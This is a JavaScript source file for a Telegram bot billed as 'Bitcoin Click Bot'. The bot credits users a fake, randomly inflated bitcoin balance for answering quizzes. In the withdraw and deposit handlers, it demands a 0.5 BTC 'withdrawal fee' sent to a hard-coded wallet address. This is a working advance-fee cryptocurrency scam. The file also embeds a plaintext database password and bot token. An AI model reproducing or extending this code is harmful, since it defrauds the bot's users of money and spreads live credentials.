const Telegraf=require('telegraf')
const session = require('telegraf/session')
const Stage = require('telegraf/stage')
const Markup = require('telegraf/markup')
const WizardScene = require('telegraf/scenes/wizard')
const Extra = require('telegraf/extra')
const axios = require('axios')
const Keyboard = require('telegraf-keyboard');
const mongodb = require('mongodb');
const Decimal128 = mongodb.Decimal128;
var nodemailer = require('nodemailer');
const MongoClient = mongodb.MongoClient;

const bot = new Telegraf('13 jvmvhjkvh:AAEpW187NhJD2n8ZI4KY6Xs3hvjftdjghc')
bot.telegram.deleteWebhook().then(success => {
  success && console.log('🤖 is listening to your bro ther')
  bot.startPolling()
})

const urlAPI = 'https://quiz.revolut1on.com/'

const tofQuizWizard = new WizardScene('tof-quiz-wizard',
  async (ctx) => {
      tofQuizData = await getTofQuizRandom()

      tofQuizStatement = `<i>${tofQuizData.quiz.statement}</i>\n<b>TRUE</b> oR <b>FALSE</b>?`
      tofQuizPhoto = `${urlAPI}/img/tof/${tofQuizData.quiz.url_photo}`

      ctx.replyWithPhoto(tofQuizPhoto,
        Extra.load({
          caption: tofQuizStatement,
          parse_mode: 'HTML'
        })
        .markup(Markup.inlineKeyboard([
          Markup.callbackButton('TRUE', `true ${tofQuizData.quiz.id}`),
          Markup.callbackButton('FALSE', `false ${tofQuizData.quiz.id}`)
        ])))

      return ctx.wizard.next()
    },

    // add another wizard.next() to increment btc balance or
    async (ctx) => {
     //////////////////////////////////////////////////////////////////////////////////////////////
        const uri =
       'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
     const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try { 
    await client.connect();
    const database = client.db("telegrambot");
    const collection = database.collection("users");

    // Query for a movie that has the title 'The Room'
    const query = { _id: ctx.callbackQuery.from.id };
    const movie = await collection.findOne(query);
    console.log(movie.price.toString());
    //then update
     var listPlans = ['500','586','600','700','800','900','1000','780','999','501','655','599','877','560','790','880','780','990','780','667'];
     var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
    const upload=parseInt(movie.price)+parseInt(plan);
    const stringupload=upload.toString();
    const filter = { _id: ctx.callbackQuery.from.id };
    const updateDoc = {
      $set: {
       price: Decimal128.fromString(stringupload),
      },
    };
    const result = await collection.updateOne(filter, updateDoc);
  } finally {
    await client.close();
  }
//////////////////////////////////////////////////////////////////////////////////////////////////
      return ctx.scene.leave()
    }
)
const stage = new Stage([tofQuizWizard])

 bot.start(async ctx =>{ 
  const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try { 
    await client.connect();

    const database = client.db("telegrambot");
    const collection = database.collection("users");

    // Query for a movie that has the title 'The Room'
    const query = { _id: ctx.message.from.id };
    const movie = await collection.findOne(query);
    const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')
  ctx.reply(`<b>Hello ${ctx.message.from.first_name}</b>. <i>How are you today?</i>\n\n<i>Welcome to Bitcoin Click Bot! 🔥This bot lets you earn Bitcoin🤑🤑🤑 by completing simple tasks.</i>`,
    Extra.HTML()
    .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 Menu', 'menu')
    ])))
 ctx.reply('Keyboard',keyboard.draw(),'<i>bro i am comming am still writing the code 😊</i>',)
    // since this method returns the matched document, not a cursor, print it directly
    console.log("rgertghtgte");
    console.log(movie);

//insert new userdata
    if (movie==null){
            const newUser = {
    _id: ctx.message.from.id,
    name: ctx.message.from.first_name,
    price: Decimal128.fromString("0"), // store this as 128bit decimal in MongoDB
  };
    const result = await collection.insertOne(newUser);
    console.log(
      `${result.insertedCount} documents were inserted with the _id: ${result.insertedId}`,
    );
    }

  } finally {
    await client.close();
  }
  //creteuser(ctx)
})

bot.use(async (ctx, next) => {
  const start = new Date()
  await next()
  const response_time = new Date() - start
  console.log(`(Response Time: ${response_time})`)
})
bot.use(session())
bot.use(stage.middleware())
 

////////////////////////////////////////////////////////////////////////////
//bot.action('mine', (ctx) => {
// ctx.scene.enter('tof-quiz-wizard')
//})

 bot.hears('💰 Balance', (ctx) => {
   const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')
    find(ctx.message.from.id,ctx).catch(console.log('dddd'));
   // ctx.reply('<i>Your is : 0.000BTC</i>', Extra.HTML() .markup(Markup.inlineKeyboard([
    //  Markup.callbackButton('🏠 Menu', 'menu'),
   // ])))
})



bot.hears('💵 Withdraw', async ctx => {
    const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')

 const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try { 
    await client.connect();

    const database = client.db("telegrambot");
    const collection = database.collection("users");
    const query = { _id: ctx.message.from.id };
    const movie = await collection.findOne(query);
    console.log(movie.price.toString());
    const rate=await bitcoin();
    console.log(rate)

    if(movie.price< rate ){
            const send=await  ctx.reply(`<i>You have not reached the withdrawal limit</i>\n<i>withdrawal limit is 1 BTC</i>\n<i>current BTC price 💰${rate.toString()}</i>`, Extra.HTML() .markup(Markup.inlineKeyboard([
            Markup.callbackButton('🏠 click to send wallet address', 'menu'),
    ])))
    }
    if(movie.price> rate ){
            const send=await  ctx.reply(`<i>click on deposit to send your withdrawal fee</i>\n\n<i>current BTC price 💰${rate.toString()}</i>`, Extra.HTML() .markup(Markup.inlineKeyboard([
            Markup.callbackButton('🏠 menu', 'menu'),
    ])))
    }

  } finally {
    await client.close();
  }
 })



 bot.hears('➕ Deposit', async ctx => {
    const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
     .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')

  const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try { 
    await client.connect();

    const database = client.db("telegrambot");
    const collection = database.collection("users");
    const query = { _id: ctx.message.from.id };
    const movie = await collection.findOne(query);
    console.log(movie.price.toString());
    const rate=await bitcoin();
    console.log(rate)

    if(movie.price< rate ){
            const send=await  ctx.reply(`<i>balance is $${movie.price.toString()} worth of BTC </i>\n\n<i>Deposit to boost mining power.Pay to our official blockchain wallet</i>\n\n<i>19bmjXeTvFHXnPaKyaaVMhmur9oKz7MAru</i>`, Extra.HTML() .markup(Markup.inlineKeyboard([
            Markup.callbackButton('🏠 menu', 'menu'),
    ])))
    }
    if(movie.price> rate ){
      //you may have to calculate the 50% from user balance
            const send=await   ctx.reply('<i>Send 0.5 BTC to our official wallet address:</i><i>19bmjXeTvFHXnPaKyaaVMhmur9oKz7MAru</i>\n\n<i>send your wallet address and telegram userFirstName to sahlalmum@gmail.com</i>', Extra.HTML() .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 Menu', 'menu'),
    ])))
            ///send mail to solomon
            {
              /*
                 var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'youremail@gmail.com',
    pass: 'yourpassword'
  }
});
            var mailOptions = {
  from: 'youremail@gmail.com',
  to: 'myfriend@yahoo.com',
  subject: 'Sending Email using Node.js',
  text: 'That was easy!'
};

transporter.sendMail(mailOptions, function(error, info){
  if (error) {
    console.log(error);
  } else {
    console.log('Email sent: ' + info.response);
  }
});
              */
            }
  
    }

  } finally {
    await client.close();
  }
 
})


{/*  
 bot.hears('💰💰mine', (ctx) => {
    const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')
  ctx.reply('<i>bro i am comming am still writing the code 😊</i>', Extra.HTML() .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 Menu', 'menu'),
    ])))
ctx.reply('Keyboard',keyboard.draw(),'<i>bro i am comming am still writing the code 😊</i>',)})

*/}

  bot.action('menu', (ctx) => {
    const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')
  ctx.reply('<i>This bot lets you earn bitcoin by completing simple tasks.</i>\n\n<i>Press ⛏💰💰mine to earn by completing tasks</i>', Extra.HTML() .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 menu', 'menu'),
    ])))
  ctx.reply('Keyboard',keyboard.draw(),'<i>bro i am comming am still writing the code 😊</i>',)
})


// here we incremenntr the value once the user click the link
bot.hears('⛏💰💰mine', async (ctx) => {
  ctx.scene.enter('tof-quiz-wizard')
})

///////////////////////////////////////////////////////////////////////////////

async function getTofQuizRandom() {
  const response = await axios.get(`${urlAPI}api/tof-quiz-random/`)
  const data = await response.data

  return data
}

async function getSpecificQuiz(tofQuizId) {
  const response = await axios.get(`${urlAPI}api/tof-quiz/${tofQuizId}`)
  const data = await response.data

  return data
}

async function postTofQuiz(tofQuizId, userAnswer, userId) {
  const response = await axios.post(`${urlAPI}api/tof-answer`, {
    'tofquiz_id': tofQuizId,
    'answer': userAnswer,
    'id_telegram': userId
  })
  const data = await response.data

  return data
}

async function getUserAnswerPercent(answers) {
  trueCount = 0
  falseCount = 0
  await answers.forEach(element => {
    if (element.answer == true) trueCount++
    else falseCount++
  });

  truePercent = ((trueCount / answers.length) * 100).toString().slice(0, 3)
  falsePercent = ((falseCount / answers.length) * 100).toString().slice(0, 3)

  answerPercent = await `Count Answer:\n— ${truePercent}% Answer TRUE\n— ${falsePercent}% Answer FALSE\n`
  return answerPercent
}


async function find(id,ctx) {
  const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try { 
    await client.connect();

    const database = client.db("telegrambot");
    const collection = database.collection("users");

    // Query for a movie that has the title 'The Room'
    const query = { _id: id };
    const movie = await collection.findOne(query);
    const telegrmm=await  ctx.reply(`<i>Your Balance is💰 $${movie.price.toString()} worth of BTC</i>`, Extra.HTML() .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 Menu', 'menu'),
    ])))
    // since this method returns the matched document, not a cursor, print it directly
    console.log(movie.price.toString());
    const come=movie
    return come
  } finally {
    await client.close();
  }
}

async function update() {
  const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';

const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try {
    await client.connect();
    const database = client.db("telegrambot");
    const collection = database.collection("users");
    const filter = { _id: "Blacksmith Scene" };
    const updateDoc = {
      $set: {
       price: Decimal128.fromString("0"),
      },
    };
    const result = await collection.updateOne(filter, updateDoc);
    console.log(
      `${result.matchedCount} document(s) matched the filter, updated ${result.modifiedCount} document(s)`,
    );
  } finally {
    await client.close();
  }
}

async function creteuser(ctx) {
   const uri =
  'mongodb+srv://realcoinnbots:kUuhBI7dfP5udX9O@cluster0.hqxdg.mongodb.net/telegrambot?retryWrites=true&w=majority';
const client = new MongoClient(uri,{ useUnifiedTopology: true });
  try {
    await client.connect();

    const database = client.db("telegrambot");
    const collection = database.collection("users");
    // create a document to be inserted
    const newUser = {
    _id: ctx.message.from.id,
    name: ctx.message.from.first_name,
    price: Decimal128.fromString("0"), // store this as 128bit decimal in MongoDB
  };
    const result = await collection.insertOne(newUser);
    console.log(
      `${result.insertedCount} documents were inserted with the _id: ${result.insertedId}`,
    );
     const options = {
    inline: false, // default
    duplicates: false, // default
    newline: false, // default
  };
  const keyboard = new Keyboard(options);
  keyboard
    .add('💰 Balance', '💵 Withdraw', '➕ Deposit') // first line
    .add('⛏💰💰mine') // second line
    .remove('Item 2')
    .rename('Item 10', 'Item 2')
  ctx.reply('<b>Hello</b>. <i>How are you today?</i>\n\n<i>Welcome to Bitcoin Click Bot! 🔥This bot lets you earn Bitcoin🤑🤑🤑 by completing simple tasks.</i>',
    Extra.HTML()
    .markup(Markup.inlineKeyboard([
      Markup.callbackButton('🏠 Menu', 'menu')
    ])))
 ctx.reply('Keyboard',keyboard.draw(),'<i>bro i am comming am still writing the code 😊</i>',)
  } finally {
    await client.close();
  }
}


async function bitcoin() {
  const response = await axios.get("https://api.coindesk.com/v1/bpi/currentprice.json")
  const data = await response.data
  console.log(data)
  console.log(data["bpi"]["USD"]["rate_float"])
  const rate= data["bpi"]["USD"]["rate_float"]
  return rate
}